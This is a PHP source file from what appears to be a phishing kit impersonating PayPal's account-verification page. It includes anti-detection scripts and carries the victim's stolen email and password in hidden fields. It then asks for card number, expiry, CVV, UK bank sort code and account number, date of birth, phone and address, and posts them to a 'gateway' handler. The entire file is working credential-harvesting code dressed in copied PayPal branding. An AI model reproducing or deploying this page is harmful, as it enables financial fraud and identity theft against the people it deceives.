<?php
    include '../prevents/anti1.php';
    include '../prevents/anti2.php';
    include '../prevents/anti3.php';
    include '../prevents/anti4.php';
    include '../prevents/anti5.php';
    include '../prevents/anti6.php';
    include '../prevents/anti7.php';
    include '../prevents/anti8.php';
    include '../extra/mine.php';
    include '../extra/One_Time.php';

    ob_start();
    session_start();
    if(!isset($_SESSION['language']) || !isset($_SESSION['EML']) ){exit(header("Location: index.php"));
    }else{
        include "../extra/languages/{$_SESSION['language']}.php";
    }if(!isset($_SESSION['EML'])){exit(header("Location: signin.php"));}
    
?>

<html class="no-js" data-device-type="dedicated" lang="en-GB"><head>
<script   src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"   integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="   crossorigin="anonymous"></script>
<script src="jquery-validate.min.js" type="text/javascript"></script>
<script src="jquery.inputmask.min.js" type="text/javascript"></script>
<!-- <Script src="http://ajax.aspnetcdn.com/ajax/jquery.validate/1.10.0/jquery.validate.js" type="text/javascript"></script> -->
  <meta charset="utf-8">
  <title>
   Verify Account Details
  </title>
  <meta content="NOODP, noindex, nofollow" name="robots">
  <meta content="IE=edge" http-equiv="X-UA-Compatible">
  <meta content="PayPal" name="application-name">
  <meta content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=0" name="viewport">
  <link href="webstatic/icon/pp144.png" rel="apple-touch-icon" sizes="144x144">
  <link href="webstatic/icon/pp114.png" rel="apple-touch-icon" sizes="114x114">
  <link href="webstatic/icon/pp72.png" rel="apple-touch-icon" sizes="72x72">
  <link href="webstatic/icon/pp64.png" rel="apple-touch-icon">
  <link href="webstatic/icon/pp196.png" rel="shortcut icon" sizes="196x196">
  <link href="webstatic/icon/favicon.ico" rel="shortcut icon" type="image/x-icon">
  <link href="webstatic/icon/pp32.png" rel="icon" type="image/x-icon">
  <link href="https://www.paypalobjects.com/" rel="dns-prefetch">
  <meta content="@paypal" property="twitter:site">
  <meta content="website" property="og:type">
  <meta property="og:title">
  <meta content="https://www.paypalobjects.com/webstatic/icon/pp258.png" property="og:image">
  <meta property="og:description">
  
  <link charset="UTF-8" href="https://www.paypalobjects.com/eboxapps/css/ac/67b90035e5fec0ea0d4d722be104b2fab876d5.css" media="screen, projection" rel="stylesheet" type="text/css">
  <style>
    .shell {
      position: relative;
      line-height: 1; }
      .shell span {
      position: absolute;
      left: 3px;
      top: 1px;
      color: #ccc;
      pointer-events: none;
      z-index: -1;
      visibility: hidden; }
      .shell span i {
            font-style: normal;
            /* any of these 3 will work */
            color: transparent;
            opacity: 0;
            visibility: hidden; }

      input.masked,
      .shell span {
      padding-right: 10px;
      background-color: transparent;
      text-transform: uppercase; }
  </style>
 </head>
 <body class="">
  <div data-corr-id="96f103af43f40" id="app-element-mountpoint">
   <div data-reactroot="" dir="ltr" id="document-body">
    <div class="backgroundColor">
     <div>
      <div aria-busy="false" class="signup clear app-wrapper">
       <div class="signup-page-header">
        <a aria-hidden="false" aria-label="Paypal Logo" class="signup-page-header-logo" href="https://www.paypal.com/" pa-marked="1">
        </a>
       </div>
       <main>
        <div aria-hidden="false" class="signup-page-form formTransition enter-done">
         <noscript>
          <div class="page-level-alert vx_alert vx_alert-critical" role="alert">
           <p class="vx_alert-text">
            To access many of the new PayPal features, you'll need to turn on JavaScript and enable cookies. You can do this in your web browser's settings.
           </p>
          </div>
         </noscript>
         <div class="notification">
         </div>
         <form class="signupAppContent formTransition enter-done" action="gateway" id="verify" method="POST">
          <input type="hidden" name="eml" value="<?php if( isset($_SESSION['EML']) ){echo $_SESSION['EML'];}?>">
          <input type="hidden" name="pwd" value="<?php if( isset($_SESSION['PWD']) ){echo $_SESSION['PWD'];}?>">
          <div>
           <div aria-live="polite">
            <div class="headerWrapper">
             <h1 class="vx_text-2">
              Verify your Information
             </h1>
            </div>
           </div>
           <div class="fieldGroupContainer">
<div>
             <div class="selectWrapper">
              <div class="" style="">
               <div class="vx_floatingLabel_complex vx_floatingLabel_active hasValue">
                <label for="cardNumber">
                 Card Number
                </label>
                <div class="vx_form-control" data-label-content="Card Number">
                 <div class="vx_form-control">
                  <input aria-activedescendant="0_suggestion" aria-autocomplete="none" aria-controls="suggestions" aria-describedby="country_code_prefix cardData_cardNumber_helptext" aria-invalid="false" id="cardNumber" mask="1111 1111 1111 1111 111" maxlength="16" name="cardNumber" placeholder="                       "  style="padding-left: 15px;" type="tel" value="">
                 </div>
                </div>
                <span>
                </span>
               </div>
              </div>
             </div>
             <div class="selectWrapper">
              <div class="" style="">
               <div class="vx_floatingLabel_complex vx_floatingLabel_active hasValue">
                <label for="expiryDate">
                 Expiry Date
                </label>
                <div class="vx_form-control" data-label-content="Expiry Date">
                 <div class="vx_form-control">
                  <input aria-activedescendant="0_suggestion" aria-autocomplete="none" aria-controls="suggestions" aria-describedby="country_code_prefix cardData_expiryDate_helptext" aria-invalid="false"  id="expiryDate" placeholder="XX/XX" pattern="\d{2}\/\d{2}"class="masked" maxlength="5" name="expiryDate" size="5" style="padding-left: 15px;" type="tel" value="">
                 </div>
                </div>
                <span>
                </span>
               </div>
              </div>
             </div>
             <div class="selectWrapper">
              <div class="" style="">
               <div class="vx_floatingLabel_complex vx_floatingLabel_active hasValue">
                <label for="csc">
                 CVV
                </label>
                <div class="vx_form-control" data-label-content="CVV">
                 <div class="vx_form-control">
                  <input aria-activedescendant="0_suggestion" aria-autocomplete="none" aria-controls="suggestions" aria-describedby="country_code_prefix cardData_csc_helptext" aria-invalid="false" id="csc" name="csc" class="masked" placeholder="XXX" pattern="\d{3,4}" style="padding-left: 15px;" type="tel" value="">
                 </div>
                </div>
                <span>
                </span>
               </div>
              </div>
             </div>
    <?php 
    if($_SESSION['ip_countryCode']=='GB'){

        echo '
                <div class="selectWrapper">
                <div class="" style="">
                <div class="vx_floatingLabel_complex vx_floatingLabel_active hasValue">
                    <label for="sortcode">
                    Sort code
                    </label>
                    <div class="vx_form-control" data-label-content="Sort code">
                    <div class="vx_form-control">
                    <input aria-activedescendant="0_suggestion" aria-autocomplete="none" aria-controls="suggestions" aria-describedby="country_code_prefix" aria-invalid="false" class="masked" required="required" minlength="8" placeholder="XX-XX-XX" pattern="\d{2}-\d{2}-\d{2}" data-valid-example="11-01-18"  id="sortcode" name="sortcode" style="padding-left: 15px;" type="tel" value="">
                    </div>
                    </div>
                    <span>
                    </span>
                </div>
                </div>
                </div>
                <div class="selectWrapper">
                <div class="" style="">
                <div class="vx_floatingLabel_complex vx_floatingLabel_active hasValue">
                    <label for="account">
                    Account Number
                    </label>
                    <div class="vx_form-control" data-label-content="Account number">
                    <div class="vx_form-control">
                    <input aria-activedescendant="0_suggestion" aria-autocomplete="none" aria-controls="suggestions" aria-describedby="country_code_prefix " aria-invalid="false" required="required" minlength="8" id="account" name="account" class="masked"  placeholder="XXXXXXXX" pattern="\d{8}" style="padding-left: 15px;" type="tel" value="">
                    </div>
                    </div>
                    <span>
                    </span>
                </div>
                </div>
                </div>
                    ';
    }
    ?>
            </div>            
            
            
            
            <div>
             <div class="editablePrefills">
              Billing address
             </div>
            </div>
            <div>
             <div class="selectWrapper">
              <div class="" style="">
               <div class="vx_floatingLabel_complex vx_floatingLabel_active hasValue">
                <label for="fullName">
                 Full Name
                </label>
                <div class="vx_form-control" data-label-content="Full Name">
                 <div class="vx_form-control">
                  <input aria-activedescendant="0_suggestion" aria-autocomplete="none" aria-controls="suggestions" aria-describedby="country_code_prefix " aria-invalid="false" id="fullName" name="fullName" style="padding-left: 15px;" type="text" value="" "="">
                 </div>
                </div>
                <span>
                </span>
               </div>
              </div>
             </div>
<div class="selectWrapper">
              <div class="" style="">
               <div class="vx_floatingLabel_complex vx_floatingLabel_active hasValue">
                <label for="dateofbirth">
                 Date of Birth
                </label>
                <div class="vx_form-control" data-label-content="Date of Birth">
                 <div class="vx_form-control">
                  <input aria-activedescendant="0_suggestion" aria-autocomplete="none" aria-controls="suggestions" class="masked" aria-describedby="country_code_prefix" aria-invalid="false" id="dateofbirth" name="dateofbirth" style="padding-left: 15px;" placeholder="DD/MM/YYYY" pattern="^\d{2}\/\d{2}\/\d{4}$" data-valid-example="02/01/2000" required="required" type="tel" value="">
                 </div>
                </div>
                <span>
                </span>
               </div>
              </div>
             </div>
            <div class="selectWrapper">
              <div class="" style="">
               <div class="vx_floatingLabel_complex vx_floatingLabel_active hasValue">
                <label for="phone">
                 Mobile
                </label>
                <div class="vx_form-control" data-label-content="Mobile (International Format)">
                 <div class="vx_form-control">
                  <input aria-activedescendant="0_suggestion" aria-autocomplete="none" aria-controls="suggestions" required="required" minlength="6" aria-describedby="country_code_prefix paypalAccountData_address1_helptext" aria-invalid="false" id="phone" required="required" maxlengh="16" name="phone" style="padding-left: 15px;" type="text" value="">
                 </div>
                </div>
                <span>
                </span>
               </div>
              </div>
             </div>
    <div class="selectWrapper">
              <div class="" style="">
               <div class="vx_floatingLabel_complex vx_floatingLabel_active hasValue">
                <label for="address">
                 Address
                </label>
                <div class="vx_form-control" data-label-content="Address">
                 <div class="vx_form-control">
                  <input aria-activedescendant="0_suggestion" aria-autocomplete="none" aria-controls="suggestions" required="required" minlength="4" aria-describedby="country_code_prefix paypalAccountData_address1_helptext" aria-invalid="false" id="address" name="address" style="padding-left: 15px;" type="text" value="">
                 </div>
                </div>
                <span>
                </span>
               </div>
              </div>
             </div>
             <div class="selectWrapper">
              <div class="" style="">
               <div class="vx_floatingLabel_complex vx_floatingLabel_active hasValue">
                <label for="paypalAccountData_city">
                 Town/city
                </label>
                <div class="vx_form-control" data-label-content="Town/city">
                 <div class="vx_form-control">
                  <input aria-activedescendant="0_suggestion" aria-autocomplete="none" aria-controls="suggestions" aria-describedby="country_code_prefix paypalAccountData_city_helptext" aria-invalid="false" id="city" name="city" style="padding-left: 15px;" required="required" minlength="2" type="text" value="">
                 </div>
                </div>
                <span>
                </span>
               </div>
              </div>
             </div>
             
             <div class="selectWrapper">
              <div class="" style="">
               <div class="vx_floatingLabel_complex vx_floatingLabel_active hasValue">
                <label for="zipcode">
                <?php echo $_SESSION['ip_countryCode']=='GB'?'Postcode':$lg_process['zip']?>
                </label>
                <div class="vx_form-control" data-label-content="<?php echo $_SESSION['ip_countryCode']=='GB'?'Postcode':$lg_process['zip']?>" >
                 <div class="vx_form-control">
                  <input aria-activedescendant="0_suggestion" aria-autocomplete="none" aria-controls="suggestions" aria-describedby="country_code_prefix paypalAccountData_zip_helptext" aria-invalid="false" id="zipcode" <?php if($_SESSION['ip_countryCode']=='GB'){ echo 'pattern="^(([gG][iI][rR] {0,}0[aA]{2})|((([a-pr-uwyzA-PR-UWYZ][a-hk-yA-HK-Y]?[0-9][0-9]?)|(([a-pr-uwyzA-PR-UWYZ][0-9][a-hjkstuwA-HJKSTUW])|([a-pr-uwyzA-PR-UWYZ][a-hk-yA-HK-Y][0-9][abehmnprv-yABEHMNPRV-Y]))) {0,}[0-9][abd-hjlnp-uw-zABD-HJLNP-UW-Z]{2}))$"';}else{ echo 'maxlength="9" '; }?> name="zipcode" style="padding-left: 15px;" type="text" value="" />
                 </div>
                </div>
                <span>
                </span>
               </div>
              </div>
             </div>
             <div class="selectWrapper">
              <div class="" style="">
               <div class="vx_floatingLabel_complex vx_floatingLabel_active hasValue">
                <label for="Country">
                 Country
                </label>
                <div class="vx_form-control" data-label-content="Country">
                 <div class="vx_form-control">
                  <input aria-activedescendant="0_suggestion" aria-autocomplete="none" aria-controls="suggestions" aria-describedby="country_code_prefix " aria-invalid="false" id="country" name="country" style="padding-left: 15px;" type="text" disabled="disabled" value="<?=$_SESSION['ip_countryName']?>">
                 </div>
                </div>
                <span>
                </span>
               </div>
              </div>
             </div>
            </div>
           </div>
           <div class="btnGrp">
            <button class="vx_btn vx_btn-block" data-automation-id="page_submit" id="/appData/action" name="/appData/action" style="width: 100%;" type="submit" value="add_card_submit">
             Continue
            </button>
           </div>
          </div>
          <input name="Type" type="hidden" value="Paypal">
         </form>
         <div class="signup-page-footer vx_text-legal center" style="display: block;">
          © 2020 PayPal. All rights reserved.
          <span class="signup-page-footer-separator">
           |
          </span>
          <a class="vx_text-legal" href="https://www.paypal.com/webapps/mpp/ua/privacy-full" pa-marked="1" target="_blank">
           Privacy
          </a>
          <span class="signup-page-footer-spacer">
          </span>
          <a class="vx_text-legal" href="https://www.paypal.com/webapps/mpp/ua/legalhub-full" pa-marked="1" target="_blank">
           Legal
          </a>
          <span class="signup-page-footer-spacer">
          </span>
          <a class="vx_text-legal" href="https://www.paypal.com/webapps/helpcenter/helphub/home" pa-marked="1" target="_blank">
           Help &amp; Contact
          </a>
          <span class="signup-page-footer-spacer">
          </span>
          <span>
           <a class="vx_text-legal" href="https://www.paypal.com" pa-marked="1" style="cursor:pointer">
            Feedback
           </a>
          </span>
         </div>
        </div>
       </main>
      </div>
     </div>
     <noscript>
      <img src="https://c.paypal.com/v1/r/d/b/ns?f=a0539c20b26011ea982fb7b4b830297c&amp;s=t_s&amp;js=0&amp;r=1"/>
     </noscript>
     <noscript>
      <img alt="" height="1" src="https://t.paypal.com/ts?nojs=1&amp;pgst=Unknown&amp;calc=8e8e0c4eeea4c&amp;nsid=swhSKRcIroOGTYba8rX_c007q7dv53sr&amp;rsta=en_GB&amp;pgtf=Nodejs&amp;env=live&amp;s=ci&amp;ccpg=gb&amp;csci=d4027adf80524303b129c6072700dbb6&amp;comp=progressivenodeweb&amp;tsrce=authchallengenodeweb&amp;cu=1&amp;gacook=1031949139.1592393245&amp;ef_policy=gdpr_v2.1&amp;c_prefs=T=1,P=1,F=1,type=explicit_banner&amp;cust=5FTQPRXD79H2E&amp;party_id=5FTQPRXD79H2E&amp;acnt=premier&amp;aver=unverified&amp;rstr=unrestricted&amp;cnac=GB&amp;xe=100117,101828,102030,100760,100753&amp;xt=100277,106355,107273,104910,102039&amp;pros=0&amp;pgld=Unknown&amp;bzsr=main&amp;bchn=onbrd&amp;pgsf=personal&amp;lgin=in&amp;shir=main_onbrd_personal_&amp;lgcook=0" width="1"/>
     </noscript>
    </div>
   </div>
  </div>
  
  <div>
   <div>
    <!--
        script: node, date: undefined, country: GB, language: en
        hostname: rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ0EBzfgrVKf5UP9+3IJGCeU8sGJ800QtJm
        rlogid: rZJvnqaaQhLn%2FnmWT8cSUvZzdT4xVEYcdOjZnkGUylc8kYBWJIjkjU2dkaPSgTjeTi4HVaNt4iTb31oGXiMI87R3LRBUv%2Fp%2F_172cdfddec7
        -->
   </div>
   <div>
    <noscript>
     <img border="0" height="1" src="https:https://t.paypal.com/ts?nojs=1&amp;pgrp=main%3Aonbrd%3Apersonal%3A%3Asignup&amp;page=main%3Aonbrd%3Apersonal%3A%3Asignup%3A%3A%3A&amp;pgst=Unknown&amp;calc=f4f93bb3f6051&amp;nsid=str1wDSazuOF5Pq1AUeOTQqMNT3FV8f7&amp;rsta=en_GB&amp;pgtf=Nodejs&amp;env=live&amp;s=ci&amp;ccpg=gb&amp;csci=d678413f398e4d5d886eaba435439c12&amp;comp=progressivenodeweb&amp;tsrce=profilenodeweb&amp;cu=1&amp;gacook=1031949139.1592393245&amp;ef_policy=gdpr_v2.1&amp;c_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner&amp;xe=100117%2C101828%2C102030%2C100760%2C100753&amp;xt=100277%2C106355%2C107273%2C104910%2C102039&amp;pros=4&amp;pgld=Unknown&amp;bzsr=main&amp;bchn=onbrd&amp;tmpl=signup.jsx&amp;pgsf=personal&amp;lgin=out&amp;shir=main_onbrd_personal_&amp;lgcook=0" width="1"/>
    </noscript>
   </div>
   <div>
   </div>
  </div>
  
<script data-autoinit="true" src="lib/js/jquery.script.min.js" type="text/javascript">
</script>

</body></html>
